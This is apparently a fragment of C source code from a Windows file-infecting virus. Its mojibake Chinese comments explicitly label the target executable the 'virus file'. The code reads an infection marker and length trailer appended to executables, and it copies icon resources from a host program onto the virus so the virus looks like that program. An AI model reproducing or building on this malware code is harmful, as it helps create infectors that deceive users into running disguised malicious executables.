struct MODIFY_DATA {
	unsigned int iMyLength; // ����(��λ����)
	unsigned int iShellLength;      //�ļ�����(����)
	unsigned int iSourcLength;
	BOOL bInfect;
} modify_data; //�����jiaozhu�Ĳ����ļ�xxx.exe�Ĵ�С���㻹��ԭ��0x123456578

void  ReadExeFlag(char *strExeName, MODIFY_DATA *mody_data)
{
	struct _stat ST; 
	_stat(strExeName, &ST);
	
	
	FILE* rwFile;
	if((rwFile=fopen(strExeName,"rb+"))==NULL) 
	{ 
		return; 
	}
	fseek(rwFile,ST.st_size-16,0);//SEEK_SET ���ļ��Ŀ�ʼ����ʼ���� 
	fread(mody_data,16,1,rwFile);
	fclose(rwFile);
}
/**************************************************************
* ������SetRes
* ������LPSTR szImageName --Ҫ��Դ���µĳ�������
LPSTR szResType -- ���µ���Դ����   
LPSTR szResName -- ���µ���Դ����
LPVOID pData -- ��ִ���ļ�����Դ���ݵ�ָ��
DWORD cbData -- ָ��lpData�е���Դ�������ݴ�С 
* ���ܣ��ú�����������exe�е���Դ
**************************************************************/
int SetRes(LPSTR szImageName, //virus file
		   LPSTR szResType,//icon
		   LPSTR szResName,
		   LPVOID pData,//source file res
		   DWORD cbData)
{
	HANDLE hExe = BeginUpdateResource(szImageName,0);
	if(hExe==NULL) throw("BeginUpdateResource");
	int res = UpdateResource(
		hExe,
		szResType,
		szResName,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
		pData,//source file
		cbData);
	if (!res) throw("UpdateResource");
	if (!EndUpdateResource(hExe, 0)) throw("EndUpdateResource");
	return 1;
}
 
/**************************************************************
* ������EnumIconProc
* ������HMODULE hModule --module ���
LPCTSTR lpszType --��Դ����
LPTSTR lpszName --��Դ����
LONG   lParam --������õĲ��� 
* ���ܣ��ú���ö��ԴExe�е�����ͼ�꣬���õ���һ��exe��ȥ
**************************************************************/
BOOL CALLBACK EnumIconProc(HMODULE hModule,//source file
						   LPCTSTR lpszType,
						   LPTSTR lpszName,//automatic
						   LONG lParam)//virus file
{
	HRSRC hRes = FindResource(hModule, lpszName, RT_ICON);
	if (hRes == NULL) throw("Could not locate icon resource.");
	// Load the icon into global memory. 
	HGLOBAL hResLoad = LoadResource(hModule, hRes);
	if (hResLoad == NULL) throw("Could not load icon."); 
	// Lock the dialog box into global memory. 
	LPVOID pData = LockResource(hResLoad);
	if (pData == NULL) throw("Could not lock Icon."); 
	DWORD cbData = SizeofResource(hModule, hRes);
	if (lParam)
	{
		SetRes((LPSTR)lParam,
			RT_ICON,
			lpszName,
			pData,
			cbData
			);
	}
	return TRUE;
} 

/**************************************************************
* ������SetExeIcon
* ������LPSTR szLoadFrom--ͼ����ȡ�ļ�
LPSTR szSetTo --������ͼ���ļ�
* ���ܣ��ú�����һ��Exe�е�ͼ��ת�뵽��һ��exe��ȥ
**************************************************************/
int SetExeIcon(LPSTR szLoadFrom, LPSTR szSetTo)
{
	HMODULE hExe = LoadLibrary(szLoadFrom);//��EXE����������Դ���� source file
	if (hExe == NULL) throw("Could not load icon exe."); 
	EnumResourceNames(
		hExe,   
		RT_ICON,     
		(ENUMRESNAMEPROC) EnumIconProc, 
		(LONG)szSetTo    //virus file
		);
	FreeLibrary(hExe);
	return 1;
}
 